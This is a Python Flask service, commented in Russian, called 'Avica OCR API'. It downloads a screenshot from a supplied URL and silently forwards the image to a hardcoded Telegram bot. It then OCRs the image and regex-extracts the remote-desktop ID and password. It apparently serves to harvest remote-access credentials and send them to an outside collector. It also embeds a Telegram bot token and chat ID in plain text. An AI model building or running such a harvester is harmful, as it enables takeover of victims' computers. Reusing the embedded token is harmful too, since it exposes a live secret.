from flask import Flask, request, jsonify
from PIL import Image
import pytesseract
import requests
import re
import os

app = Flask(__name__)

# =========================
# Telegram настройки (прямо, без Secrets)
# =========================
TELEGRAM_TOKEN = "5713086959:AAEsY9YIe4bkBE_VIYorOvBkXgsp-5XR_Og"
CHAT_ID = 1047092792  # число, не строка

def send_to_telegram(file_path, caption="Avica Screenshot"):
    """Отправляем картинку в Telegram"""
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
    with open(file_path, "rb") as f:
        resp = requests.post(
            url,
            data={"chat_id": CHAT_ID, "caption": caption},
            files={"photo": f}
        )
    print("[*] Telegram response:", resp.status_code, resp.text)
    if resp.status_code == 200:
        print("[+] Screenshot sent to Telegram!")
    else:
        print("[!] Telegram upload failed")

# =========================
# Flask routes
# =========================
@app.route("/")
def home():
    return "Avica OCR API is running 🚀"

@app.route("/ocr", methods=["POST"])
def ocr_avica():
    """
    JSON пример запроса:
    {
        "url": "https://example.com/avica_screenshot.png"
    }
    """
    data = request.json
    if not data or "url" not in data:
        return jsonify({"error": "Missing 'url' in JSON"}), 400

    img_url = data["url"]
    img_path = "/tmp/screenshot.png"

    # 1️⃣ Скачиваем скриншот
    try:
        resp = requests.get(img_url)
        resp.raise_for_status()
        with open(img_path, "wb") as f:
            f.write(resp.content)
        print("[+] Screenshot downloaded")
    except Exception as e:
        return jsonify({"error": f"Failed to download image: {e}"}), 400

    # 2️⃣ Отправляем скрин в Telegram
    try:
        send_to_telegram(img_path)
    except Exception as e:
        print("[!] Telegram send failed:", e)

    # 3️⃣ OCR
    try:
        img = Image.open(img_path)
        text = pytesseract.image_to_string(img)
        print("[+] OCR done")
    except Exception as e:
        return jsonify({"error": f"OCR failed: {e}"}), 500

    # 4️⃣ Ищем ID и Password через регулярку
    id_match = re.search(r"(ID|Login|User)[\s:]*([A-Za-z0-9]+)", text, re.IGNORECASE)
    pass_match = re.search(r"(Pass|Password)[\s:]*([A-Za-z0-9]+)", text, re.IGNORECASE)

    avica_id = id_match.group(2) if id_match else None
    avica_pass = pass_match.group(2) if pass_match else None

    return jsonify({
        "id": avica_id,
        "password": avica_pass,
        "raw_text": text
    })

# =========================
# Запуск Flask
# =========================
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
